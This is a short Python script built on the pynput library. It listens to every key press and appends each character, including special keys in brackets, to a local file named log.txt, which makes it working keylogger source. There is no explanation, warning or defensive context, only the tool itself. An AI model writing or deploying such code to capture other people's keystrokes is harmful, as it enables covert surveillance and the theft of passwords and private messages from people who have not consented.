from pynput import keyboard

# File to save the keystrokes
log_file = "log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f" [{key}] ")

# Start the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
